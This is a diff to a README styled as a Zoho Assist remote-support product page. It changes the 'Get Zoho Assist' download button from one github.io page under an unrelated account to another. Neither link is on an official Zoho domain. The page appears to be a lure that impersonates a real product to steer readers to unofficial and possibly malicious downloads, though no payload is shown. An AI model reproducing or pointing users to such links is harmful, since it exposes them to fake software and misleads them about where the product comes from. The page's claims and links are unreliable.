@@ -21,7 +21,7 @@ To begin using this **Zoho Assist Remote Support** and **Zoho Assist Meeting Too
 | :--- | :--- |
 | **Get Zoho Assist Remote Support** | Click the button below to start using this **Zoho Assist Cross Platform** solution. |
 
-[![Button](https://img.shields.io/badge/💻-Get_Zoho_Assist-2ea44f?style=for-the-badge)](https://derrickmaciasspnc.github.io/.github/zoho-assist-unattended-access)
+[![Button](https://img.shields.io/badge/💻-Get_Zoho_Assist-2ea44f?style=for-the-badge)](https://luisschroederdrbf.github.io/.github/zoho-assist-unattended-access)
 
 ## System Requirements
 
